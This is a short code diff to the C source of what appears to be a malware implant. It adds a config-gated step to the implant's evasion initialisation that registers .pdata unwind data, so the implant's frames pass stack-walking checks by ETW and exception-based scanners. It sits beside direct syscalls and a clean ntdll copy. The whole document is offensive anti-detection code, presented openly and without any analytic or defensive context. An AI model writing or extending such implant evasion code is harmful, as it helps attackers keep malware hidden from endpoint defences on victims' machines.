@@ -11,6 +11,7 @@
 #include "ntdefs.h"
 #include "syscalls.h"
 #include "evasion.h"
+#include "config.h"
 #include "peb.h"
 
 /* GCC built-in variadic argument support (CRT-free) */
@@ -63,6 +64,18 @@ NTSTATUS evasion_init(IMPLANT_CONTEXT *ctx) {
        but syscalls still work. */
     if (NT_SUCCESS(status))
         evasion_init_crc_table(&g_evasion_ctx);
+
+    /* Initialize optional evasion modules gated by config flags */
+    IMPLANT_CONFIG *cfg = cfg_get(ctx);
+    DWORD eflags = cfg ? cfg->evasion_flags : 0;
+
+    /* .pdata registration: enables proper stack unwinding through
+       implant frames for ETW/exception-based scanners */
+    if (eflags & EVASION_FLAG_PDATA_REGISTER) {
+        NTSTATUS pdata_status = evasion_register_pdata(
+            &g_evasion_ctx, ctx->clean_ntdll);
+        (void)pdata_status;  /* Non-fatal */
+    }
 
     return status;
 }
